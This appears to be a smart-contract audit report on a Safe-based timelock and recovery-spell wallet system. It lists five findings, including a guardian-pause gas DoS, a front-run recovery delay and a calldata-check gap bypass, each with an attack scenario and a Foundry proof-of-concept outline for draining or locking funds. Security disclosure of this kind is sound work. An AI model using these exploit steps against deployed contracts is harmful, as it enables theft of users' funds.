## [HIGH] Guardian pause can be permanently gas-DoSed by flooding live proposals
- File: src/Timelock.sol:687-700 (flood vector at src/Timelock.sol:521-539, no cap on live proposals, src/Timelock.sol:107)
- Severity: High
- Confidence: High
- Description: `pause()` must cancel every entry of the unbounded `_liveProposals` set in a single transaction, and `execute()` is permissionless. A Safe that has been coerced/compromised (the exact threat the guardian exists for) can schedule thousands of junk proposals (per-proposal `delay` has no upper bound, so junk never expires and `cleanup` cannot shrink the set), making `pause()` always exceed the block gas limit. The pause is the guardian's one-shot emergency brake (guardian is revoked on use, src/ConfigurablePause.sol:93), so the adversary it protects against can neutralize it in advance.
- Attack scenario:
  1. Cold signer keys are compromised/coerced. Via Safe `execTransaction`, attacker calls `schedule(address(1), 0, "", keccak256(abi.encode(i)), 60 days)` ~2,000-4,000 times with distinct salts (junk delays are unbounded, so proposals stay live and non-expired).
  2. Attacker schedules the malicious proposal (e.g. transfer all tokens out) with `delay = minDelay`.
  3. Guardian calls `pause()`; the loop over thousands of proposals runs out of gas and the whole transaction reverts, so the contract is never paused and nothing is cancelled. Retrying always OOGs.
  4. After `minDelay`, anyone calls the permissionless `execute()` for the malicious proposal; with no recovery spell able to help (or in guardian-only setups) all timelock funds are stolen. `cancel` is `onlySafe` (the attacker) and `cleanup` only removes expired proposals, so nothing else can stop it.
- PoC: Foundry outline:
```solidity
function testPauseDoSByProposalFlood() public {
    for (uint256 i = 0; i < 4_000; i++) {
        vm.prank(address(safe));
        timelock.schedule(address(1), 0, "", bytes32(uint256(keccak256(abi.encode(i)))), 60 days);
    }
    vm.prank(address(safe));
    timelock.schedule(token, 0, stealCalldata, bytes32("evil"), timelock.minDelay());
    vm.warp(block.timestamp + timelock.minDelay());

    (bool ok,) = address(timelock).call{gas: 30_000_000}(
        abi.encodeWithSelector(Timelock.pause.selector)
    );
    assertFalse(ok); // OOG: guardian brake bricked, nothing cancelled, not paused

    timelock.execute(token, 0, stealCalldata, bytes32("evil")); // theft executes
}
```

## [MEDIUM] Recovery delay starts at permissionless spell deployment, not at module enablement
- File: src/RecoverySpell.sol:124 (factory permissionless at src/RecoverySpellFactory.sol:44-56; module enabled later at src/InstanceDeployer.sol:274-291)
- Severity: Medium
- Confidence: Medium
- Description: `recoveryInitiated = block.timestamp` is set in the constructor, and `createRecoverySpell` is permissionless (only requires the Safe to have code). The spell only becomes usable when `createSystemInstance` enables it as a Safe module, so an attacker can deploy the spell (and the front-runnable Safe it targets) long before the system instance exists and let the entire recovery delay elapse while the spell is inert. The delay window that cold signers rely on to veto a malicious recovery spell (docs/EDGECASES.md: "important to have a longer time delay on the recovery spells than on the timelock") never exists for the newly created instance.
- Attack scenario:
  1. Victim deploys the system on chain A; the `createSystemInstance` calldata (public) reveals all spell parameters (recovery owners, thresholds, delay, salt) and the counterfactual Safe address.
  2. Attacker front-runs the victim's eventual deployment on chain B: deploys the standalone Safe at the counterfactual address (identical public setup params; `InstanceDeployer` accepts and completes an existing front-run Safe), then calls `createRecoverySpell(salt, owners, safe, threshold, recoveryThreshold, delay)` — the delay clock starts now.
  3. `delay` (e.g. 30 days) elapses while the spell is not yet a module.
  4. Victim's hot signer finally calls `createSystemInstance` on chain B (e.g. after bridging funds), enabling the spell as a module in that same transaction.
  5. Anyone immediately calls `executeRecovery`: with `recoveryThreshold == 0` (documented valid "no private keys needed" config) no signatures are required; with malicious recovery signers the pre-committed takeover executes the instant the system is created. Cold signers get zero time to veto via the timelock.
- PoC: Foundry outline:
```solidity
function testPreElapsedRecoveryDelay() public {
    address[] memory ro = [backup1, backup2, backup3];
    // attacker front-runs: standalone Safe at counterfactual address, then spell
    address[] memory deployerOnly = [address(instanceDeployer)];
    address safe = SafeProxyFactory(SAFE_FACTORY).createProxyWithNonce(
        SAFE_LOGIC, abi.encodeCall(Safe.setup, (deployerOnly, 1, address(0), "", address(0), address(0), 0, payable(0))), salt);
    address spell = recoveryFactory.createRecoverySpell(salt, ro, safe, 3, 0, 30 days);
    vm.warp(block.timestamp + 30 days + 1);
    // victim's hot signer deploys the system instance around that pre-deployed Safe+spell
    vm.prank(hotSigner);
    deployer.createSystemInstance(instance); // instance.recoverySpells = [spell]
    // same block: anyone recovers, zero reaction window despite 30-day configured delay
    vm.prank(attacker);
    RecoverySpell(spell).executeRecovery(address(1), new uint8[](0), new bytes32[](0), new bytes32[](0));
    assertEq(safe.getThreshold(), 3); // old owners rotated out
}
```

## [MEDIUM] Off-by-one in calldata-check overlap validation rejects adjacent ranges, forcing exploitable unchecked gap bytes
- File: src/Timelock.sol:1119-1123 (range semantics at src/BytesHelper.sol:35-58, enforcement at src/Timelock.sol:488-503)
- Severity: Medium
- Confidence: Medium
- Description: Ranges are half-open (`sliceBytes` returns `data[start:end]`), but the overlap check `startIndex > indexes[i].endIndex || endIndex < indexes[i].startIndex` uses strict inequalities, so two disjoint adjacent ranges (e.g. `[16,36)` for a recipient and `[36,68)` for the following amount) are rejected as "overlapping" — contradicting the contract's own spec comment ("checking 1, 2, and 3 separately is valid", src/Timelock.sol:1114) and docs/INVARIANTS.md. The only way to whitelist adjacent parameters as separate AND-checks is to leave a gap; `checkCalldata` only inspects `[startIndex, endIndex)` slices, so gap bytes are never checked and a hot signer can freely tamper with them via `executeWhitelisted`.
- Attack scenario:
  1. Cold signers whitelist `transfer(address,uint256)` pinning the recipient with check `[16,36)`.
  2. Adding the adjacent amount check `[36,68)` reverts with "CalldataList: Partial check overlap" (36 > 36 is false, 68 < 16 is false).
  3. Following the natural workaround they shift the range to `[37,68)`, pinning only the low 31 bytes of the amount; the amount's most significant byte (index 36) is now permanently unchecked.
  4. A malicious hot signer calls `executeWhitelisted(usdc, 0, abi.encodeWithSelector(transfer.selector, bob, (uint256(1) << 248) | whitelistedAmount))`; both slice checks pass, so the whitelisted amount is bypassed by ~2^248 and the timelock's balance is drained instead of the intended amount.
- PoC: Foundry outline:
```solidity
function testAdjacentRangeGapBypass() public {
    vm.startPrank(address(timelock));
    bytes[] memory rcpt = new bytes[](1); rcpt[0] = abi.encodePacked(bob);
    timelock.addCalldataCheck(usdc, IERC20.transfer.selector, 16, 36, rcpt);
    bytes[] memory amt = new bytes[](1); amt[0] = abi.encodePacked(uint256(1000e6));
    vm.expectRevert("CalldataList: Partial check overlap");
    timelock.addCalldataCheck(usdc, IERC20.transfer.selector, 36, 68, amt); // off-by-one
    bytes[] memory amt31 = new bytes[](1); amt31[0] = abi.encodePacked(uint256(1000e6))[1:];
    timelock.addCalldataCheck(usdc, IERC20.transfer.selector, 37, 68, amt31); // forced gap
    vm.stopPrank();

    uint256 evil = (uint256(1) << 248) | 1000e6; // tampered unchecked byte 36
    vm.prank(HOT_SIGNER);
    timelock.executeWhitelisted(usdc, 0, abi.encodeWithSelector(IERC20.transfer.selector, bob, evil));
    // executes a transfer of ~2^248 tokens (full balance if funded) instead of 1000e6
}
```

## [MEDIUM] Recovery spell factory accepts owners the Safe can never install, permanently bricking recovery
- File: src/RecoverySpellFactory.sol:135-137 (triggers src/RecoverySpell.sol:268-280)
- Severity: Medium
- Confidence: Medium
- Description: `_paramChecks` only rejects `address(0)` (the documented 09/18/24 fix), but Gnosis Safe `addOwnerWithThreshold`/`swapOwner` also revert GS013 for the `SENTINEL` owner `address(0x1)` and the Safe's own address. A spell created with such an owner deploys successfully yet `executeRecovery` can never succeed — every attempt reverts atomically ("RecoverySpell: Recovery failed") with the spell left armed, so the recovery safety net silently never existed and funds are locked when keys are lost.
- Attack scenario:
  1. A fat-fingered or compromised frontend configures recovery owners containing `0x...01` (a common placeholder/burner seat) or the Safe's own address; `createRecoverySpell` passes all factory checks.
  2. The system is created and the spell enabled as a module; everything appears healthy on-chain.
  3. Years later the primary keys are lost and `executeRecovery` is called: `swapOwner(SENTINEL, survivor, 0x1)` (owners[0] case) or `addOwnerWithThreshold(0x1, 1)` (owners[i>=1] case) reverts GS013 inside the Multicall3 aggregate, rolling back the whole recovery.
  4. Every retry reverts identically (owner list immutable); recovery is permanently impossible and the wallet's funds are locked.
- PoC: Foundry outline:
```solidity
function testSentinelOwnerBricksRecovery() public {
    address[] memory bad = [address(0x1), backup1];
    RecoverySpell spell = recoveryFactory.createRecoverySpell(bytes32(0), bad, address(safe), 1, 0, 1 days);
    vm.warp(block.timestamp + 1 days + 1);
    vm.expectRevert("RecoverySpell: Recovery failed"); // GS013 from swapOwner/addOwnerWithThreshold
    spell.executeRecovery(address(1), new uint8[](0), new bytes32[](0), new bytes32[](0));
    // spell remains armed but every future attempt reverts identically
}
```

## [MEDIUM] executeRecovery permanently reverts when owners[0] is the surviving Safe owner
- File: src/RecoverySpell.sol:259-273
- Severity: Medium
- Confidence: Medium
- Description: The rotation removes every current owner except the last entry of `safe.getOwners()` (the oldest owner — in Kleidi deployments the first configured owner, since InstanceDeployer swaps it in first), then calls `swapOwner(SENTINEL, survivor, owners[0])`. Safe's `swapOwner` requires the new owner not already be an owner (GS013), so if the spell's `owners[0]` equals that surviving owner the recovery always reverts and can never succeed. This is not checkable at creation time because the Safe's owner set changes over time, and the natural "keep the primary signer, add backups" configuration (primary listed first) triggers exactly this collision.
- Attack scenario:
  1. System deployed with owners `[Alice, Bob]` (Alice is oldest/first configured). Recovery spell configured with new owners `[Alice, Backup1]` — intent: keep Alice, add a backup on recovery.
  2. Alice's and Bob's keys are lost (the scenario recovery exists for), so the Safe owner set can no longer be reordered or the spell swapped out through the timelock.
  3. `executeRecovery` removes Bob, then `swapOwner(SENTINEL, Alice, Alice)` reverts GS013, rolling back the entire recovery.
  4. Every retry fails identically; recovery is permanently bricked and funds are locked.
- PoC: Foundry outline:
```solidity
function testSurvivorCollisionBricksRecovery() public {
    // system created with instance.owners = [alice, bob] => alice is the oldest owner
    address[] memory newOwners = [alice, backup1]; // "keep primary, add backup"
    RecoverySpell spell = recoveryFactory.createRecoverySpell(salt, newOwners, address(safe), 1, 1, 1 days);
    (uint8[] memory v, bytes32[] memory r, bytes32[] memory s) = signBy(backup1, spell.getDigest());
    vm.warp(block.timestamp + 1 days + 1);
    vm.expectRevert("RecoverySpell: Recovery failed"); // inner swapOwner(SENTINEL, alice, alice) => GS013
    spell.executeRecovery(address(timelockModule), v, r, s);
    // assert safe owners unchanged and spell permanently unusable on every retry
}
```

## Coverage
- src/BytesHelper.sol
- src/ConfigurablePause.sol
- src/Guard.sol
- src/InstanceDeployer.sol
- src/RecoverySpell.sol
- src/RecoverySpellFactory.sol
- src/Timelock.sol
- src/TimelockFactory.sol
- src/deploy/SystemDeploy.s.sol
- src/interface/CErc20Interface.sol
- src/interface/CEtherInterface.sol
- src/interface/IMorpho.sol
- src/interface/IMulticall3.sol
- src/interface/WETH9.sol
- src/utils/Constants.sol
- src/utils/Create2Helper.sol
- src/views/AddressCalculation.sol
